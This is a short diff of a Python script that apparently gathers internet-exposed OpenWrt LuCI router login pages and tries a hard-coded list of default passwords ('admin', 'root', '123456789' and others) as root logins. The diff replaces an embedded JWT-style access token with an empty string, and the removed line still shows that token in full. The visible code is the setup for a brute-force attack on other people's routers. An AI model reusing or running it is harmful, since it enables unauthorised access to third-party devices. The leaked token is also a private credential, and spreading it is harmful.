@@ -23,7 +23,7 @@ title = parse.quote("OpenWrt - LuCI")
 ip_list = []
 pwd = ["password", "admin", "passwd", "root", "123456789", "adminadmin", "rootroot", "12345678", "1234567890", "13579abc"]
 c = 1 #重新读取json中IP开关变量，当为1时重新读取，当为0时不再读取。
-ck = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjMwYjYwZGNjZDM2MCIsImVtYWlsIjoiMzQ2NjQ1NjYzQHFxLmNvbSIsImV4cCI6MTY2Njk1NjgxNS4wfQ.1DFqDR0VUc4pSVHKbqi1ErtAb4lGkPWHF9nJq--lppo"
+ck = ""
 pData = ["luci_username=root&luci_password=", "username=root&password="]
 num = 0
 
@@ -38,7 +38,8 @@ headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/
 					"Accept-Encoding": "gzip,deflate", \
 					"Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7", \
 					"cookie": "__jsluid_s=19a90c545b2376182d80a3b300734c30", \
-					"X-Requested-With": "mark.via.gp"}
+					"X-Requested-With": "mark.via.gp"}
+
 def down_json():
 	for page in range(1, 21):
 		try:
